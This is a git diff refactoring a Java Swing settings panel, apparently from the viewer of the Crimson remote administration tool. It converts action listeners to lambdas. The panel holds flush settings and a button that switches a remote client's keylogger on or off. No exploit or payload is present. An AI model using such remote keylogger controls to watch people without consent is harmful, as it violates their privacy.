@@ -20,8 +20,6 @@ package com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.
 import java.awt.Dimension;
 import java.awt.Font;
 import java.awt.Insets;
-import java.awt.event.ActionEvent;
-import java.awt.event.ActionListener;
 import java.util.concurrent.ExecutionException;
 
 import javax.swing.DefaultComboBoxModel;
@@ -86,32 +84,31 @@ public class Settings extends JPanel {
 		panel.setLayout(null);
 
 		JButton btnApply = new JButton("Apply");
-		btnApply.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent e) {
-				ep.drop();
-				new SwingWorker<Void, Void>() {
+		btnApply.addActionListener(e -> {
+			ep.drop();
+			new SwingWorker<Void, Void>() {
 
-					@Override
-					protected Void doInBackground() throws Exception {
-						RQ_ChangeSetting.Builder rq = RQ_ChangeSetting.newBuilder();
-						if (getMethod() != method) {
-							rq.setFlushMethod(getMethod());
-						}
-
-						if (CUtil.Validation.flushValue(textField.getText())
-								&& flushValue != Integer.parseInt(textField.getText())) {
-							rq.setFlushValue(Integer.parseInt(textField.getText()));
-						}
-
-						if (rq.hasFlushMethod() || rq.hasFlushValue()) {
-							ViewerCommands.changeSetting(cid, rq.build());
-						}
-
-						return null;
+				@Override
+				protected Void doInBackground() throws Exception {
+					RQ_ChangeSetting.Builder rq = RQ_ChangeSetting.newBuilder();
+					if (getMethod() != method) {
+						rq.setFlushMethod(getMethod());
 					}
 
-				}.execute();
-			}
+					if (CUtil.Validation.flushValue(textField.getText())
+							&& flushValue != Integer.parseInt(textField.getText())) {
+						rq.setFlushValue(Integer.parseInt(textField.getText()));
+					}
+
+					if (rq.hasFlushMethod() || rq.hasFlushValue()) {
+						ViewerCommands.changeSetting(cid, rq.build());
+					}
+
+					return null;
+				}
+
+			}.execute();
+
 		});
 		btnApply.setMargin(new Insets(2, 4, 2, 4));
 		btnApply.setFont(new Font("Dialog", Font.BOLD, 10));
@@ -129,12 +126,7 @@ public class Settings extends JPanel {
 		panel.add(lblRefreshValue);
 
 		comboBox = new JComboBox<String>();
-		comboBox.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				refreshFlushMethod();
-
-			}
-		});
+		comboBox.addActionListener(e -> refreshFlushMethod());
 		comboBox.setFont(new Font("Dialog", Font.BOLD, 10));
 		comboBox.setModel(new DefaultComboBoxModel<String>(methodStrings));
 		comboBox.setBounds(182, 71, 87, 19);
@@ -153,38 +145,36 @@ public class Settings extends JPanel {
 		panel.add(lblKeyloggerStatus);
 
 		btnStart = new JButton();
-		btnStart.addActionListener(new ActionListener() {
+		btnStart.addActionListener(e -> {
+			btnStart.setEnabled(false);
+			sl.setInfo("loading...");
 
-			public void actionPerformed(ActionEvent e) {
-				btnStart.setEnabled(false);
-				sl.setInfo("loading...");
+			new SwingWorker<Outcome, Void>() {
+				@Override
+				protected Outcome doInBackground() throws Exception {
+					return ViewerCommands.changeSetting(cid, RQ_ChangeSetting.newBuilder()
+							.setKeyloggerState(keyloggerStatus ? State.OFFLINE : State.ONLINE).build());
+				}
 
-				new SwingWorker<Outcome, Void>() {
-					@Override
-					protected Outcome doInBackground() throws Exception {
-						return ViewerCommands.changeSetting(cid, RQ_ChangeSetting.newBuilder()
-								.setKeyloggerState(keyloggerStatus ? State.OFFLINE : State.ONLINE).build());
+				protected void done() {
+					try {
+						Outcome outcome = get();
+						if (outcome.getResult()) {
+							keyloggerStatus = !keyloggerStatus;
+						}
+					} catch (InterruptedException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					} catch (ExecutionException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
 					}
 
-					protected void done() {
-						try {
-							Outcome outcome = get();
-							if (outcome.getResult()) {
-								keyloggerStatus = !keyloggerStatus;
-							}
-						} catch (InterruptedException e) {
-							// TODO Auto-generated catch block
-							e.printStackTrace();
-						} catch (ExecutionException e) {
-							// TODO Auto-generated catch block
-							e.printStackTrace();
-						}
+					refreshStatus();
+					btnStart.setEnabled(true);
+				};
+			}.execute();
 
-						refreshStatus();
-						btnStart.setEnabled(true);
-					};
-				}.execute();
-			}
 		});
 		btnStart.setMargin(new Insets(2, 4, 2, 4));
 		btnStart.setFont(new Font("Dialog", Font.BOLD, 10));
